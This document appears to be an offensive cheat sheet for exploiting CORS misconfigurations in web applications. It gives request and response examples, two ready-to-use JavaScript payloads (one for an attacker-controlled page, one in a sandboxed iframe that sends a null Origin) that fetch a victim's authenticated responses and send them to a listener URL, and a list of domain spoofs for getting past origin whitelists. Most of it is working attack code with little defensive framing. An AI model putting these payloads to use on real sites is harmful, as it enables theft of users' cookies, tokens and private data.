# CORS

## Insecure configurations

### Access allowed from any domain

Request

```
GET <trget url> HTTP/1.1
Host: <target url>
Origin: <listener url>
```

Response

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: <listener url>
Access-Control-Allow-Credentials: true
```

#### Payload

Place this script on a controlled website. When a user hits the website the script sends a request and stores the response including cookies and tokens at \<listener url>/log. By navigating to this url an attacker is able to read the full content of the response

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','<url>',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='<listener url>/log'+this.responseText;
};
```

### Allowed NULL Origin

Request

```
GET <url> HTTP/1.1
Host: <url>
Origin: null
```

Response

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

#### Payload

Include the script in an iframe so that the Origin is set to null

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','<url>',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='<listener url>/log?key='+this.responseText;
};
</script>"></iframe>
```

### CORS Headers parsing error

To attempt to bypass CORS Origin whitelist it is possible to modify the server's name to include part of the target subdomain in order to spoof detection for instance:

```
Allowed any from domain: site.com

evil-site.com #CORS check only the end
site-evil.com #CORS check only the beginning
site.evil.com #CORS check only top domain
```
